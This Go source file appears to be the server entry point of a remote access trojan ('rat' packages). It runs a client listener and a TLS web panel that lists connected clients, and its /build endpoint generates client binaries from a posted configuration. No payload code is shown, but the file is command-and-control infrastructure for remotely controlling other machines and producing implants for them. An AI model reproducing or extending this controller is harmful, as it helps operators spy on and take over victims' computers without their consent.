package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"rat/command/build"
	"rat/common"
)

type ClientPage struct {
	*Client
}

func NewSingle(client *Client) ClientPage {
	return ClientPage{client}
}

func main() {
	config := Server{
		Address: "localhost:9999",
	}

	go Listen(&config)

	funcMap := template.FuncMap{
		"Version": func() string { return common.Version },
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		t := template.Must(template.New("index.template.html").Funcs(funcMap).ParseFiles("web/index.template.html"))

		err := t.Execute(w, &Clients)

		if err != nil {
			panic(err)
		}
	})
	http.HandleFunc("/clients", func(w http.ResponseWriter, r *http.Request) {
		t := template.Must(template.New("clients.template.html").Funcs(funcMap).ParseFiles("web/clients.template.html"))

		err := t.Execute(w, &Clients)

		if err != nil {
			panic(err)
		}
	})
	http.HandleFunc("/build", func(w http.ResponseWriter, r *http.Request) {
		decoder := json.NewDecoder(r.Body)
		var config build.BuildConfig
		decoder.Decode(&config)
		err := build.Build(&config, w)

		if err != nil {
			fmt.Println("build:", err.Error())
			w.Write([]byte(err.Error()))
		}
	})
	http.Handle("/static/", http.StripPrefix("/static/", http.FileServer(http.Dir("./web/static"))))
	http.Handle("/scripts/", http.StripPrefix("/scripts/", http.FileServer(http.Dir("./web/scripts"))))

	InitControlSocket()

	log.Fatal(http.ListenAndServeTLS("localhost:7777", "cert.pem", "private.key", nil))
}

func init() {
	InitPackets()
}
